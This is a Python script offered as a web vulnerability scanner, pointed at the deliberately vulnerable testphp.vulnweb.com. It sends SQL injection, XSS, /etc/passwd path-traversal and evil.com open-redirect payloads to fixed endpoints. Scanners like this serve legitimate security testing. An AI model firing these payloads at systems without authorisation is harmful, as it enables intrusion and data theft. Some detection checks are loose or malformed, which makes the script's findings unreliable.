#!/usr/bin/env python3
"""
Fixed Web Vulnerability Scanner for AION
Works with testphp.vulnweb.com
"""

import requests
import urllib.parse
import time
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SQLInjectionScanner:
    """SQL injection scanner - FIXED VERSION"""
    
    def __init__(self, url):
        self.base_url = url.rstrip('/')
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AION Scanner'
        })
        
    def scan(self):
        print("[*] Scanning for SQL injection vulnerabilities...")
        
        # Specific endpoints for testphp.vulnweb.com
        test_endpoints = [
            f"{self.base_url}/artists.php?artist=1",
            f"{self.base_url}/listproducts.php?cat=1",
            f"{self.base_url}/product.php?id=1",
            f"{self.base_url}/showimage.php?file=1.jpg"
        ]
        
        payloads = [
            ("'", "syntax error"),
            ("' OR '1'='1", "mysql"),
            ("' AND '1'='2", "mysql"),
            ("' UNION SELECT 1,2,3--", "union"),
            ("1' ORDER BY 1--", "order"),
            ("1' ORDER BY 10--", "order"),
            ("' SLEEP(3)", "sleep"),
            ("admin'--", "admin")
        ]
        
        for endpoint in test_endpoints:
            base_param = endpoint.split('=')[0] + '='
            current_val = endpoint.split('=')[1] if '=' in endpoint else ''
            
            for payload, vuln_type in payloads:
                try:
                    # Test with payload appended
                    test_value = str(current_val) + payload
                    test_url = base_param + urllib.parse.quote(test_value)
                    
                    # Send request
                    start = time.time()
                    response = self.session.get(test_url)
                    response_time = time.time() - start
                    
                    # Check for SQL errors
                    if any(err in response.text.lower() for err in ['sql', 'mysql', 'ora-', 'syntax']):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                        print(f"[!] SQL injection found at {test_url[:60]}...")
                        continue
                    
                    # Check time-based
                    if 'sleep' in payload.lower() and response_time > 2.5:
                        self.vulnerabilities.append({
                            'type': 'Time-based SQL Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                        print(f"[!] Time-based SQL injection found")
                        
                except Exception as e:
                    continue
        
        if not self.vulnerabilities:
            print("[*] No SQL injection vulnerabilities detected")
        else:
            print(f"[+] Found {len(self.vulnerabilities)} SQL injection vulnerabilities")
        
        return self.vulnerabilities


class XSSScanner:
    """XSS scanner - FIXED VERSION"""
    
    def __init__(self, url):
        self.base_url = url.rstrip('/')
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        
    def scan(self):
        print("[*] Scanning for XSS vulnerabilities...")
        
        test_endpoints = [
            f"{self.base_url}/search.php?searchTest=test",
            f"{self.base_url}/?search=test",
            f"{self.base_url}/index.php?page=test"
        ]
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for endpoint in test_endpoints:
            base_param = endpoint.split('=')[0] + '='
            
            for payload in payloads:
                try:
                    # Test with unencoded payload
                    test_url = base_param + payload
                    response = self.session.get(test_url)
                    
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'Reflected XSS',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Medium'
                        })
                        print(f"[!] XSS found at {test_url[:60]}...")
                        
                except Exception:
                    continue
        
        if not self.vulnerabilities:
            print("[*] No XSS vulnerabilities detected")
        
        return self.vulnerabilities


class LFIRFIScanner:
    """LFI scanner - FIXED VERSION"""
    
    def __init__(self, url):
        self.base_url = url.rstrip('/')
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        
    def scan(self):
        print("[*] Scanning for LFI/RFI vulnerabilities...")
        
        test_endpoints = [
            f"{self.base_url}/showimage.php?file=1.jpg",
            f"{self.base_url}/page.php?page=home"
        ]
        
        payloads = [
            "../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "/etc/passwd"
        ]
        
        for endpoint in test_endpoints:
            base_param = endpoint.split('=')[0] + '='
            
            for payload in payloads:
                try:
                    test_url = base_param + payload
                    response = self.session.get(test_url)
                    
                    if "root:x:" in response.text:
                        self.vulnerabilities.append({
                            'type': 'LFI',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                        print(f"[!] LFI found at {test_url[:60]}...")
                        
                except Exception:
                    continue
        
        if not self.vulnerabilities:
            print("[*] No LFI vulnerabilities detected")
        
        return self.vulnerabilities


class OpenRedirectScanner:
    """Open redirect scanner"""
    
    def __init__(self, url):
        self.base_url = url.rstrip('/')
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.allow_redirects = False
        
    def scan(self):
        print("[*] Scanning for open redirect vulnerabilities...")
        
        test_urls = [
            f"{self.base_url}/?redirect=http://evil.com",
            f"{self.base_url}/?url=http://evil.com",
            f"{self.base_url}/?next=http://evil.com"
        ]
        
        for test_url in test_urls:
            try:
                response = self.session.get(test_url)
                if response.status_code in [301, 302]:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location or 'http' in location:
                        self.vulnerabilities.append({
                            'type': 'Open Redirect',
                            'url': test_url,
                            'redirects_to': location,
                            'severity': 'Medium'
                        })
                        print(f"[!] Open redirect found at {test_url}")
            except Exception:
                continue
        
        return self.vulnerabilities
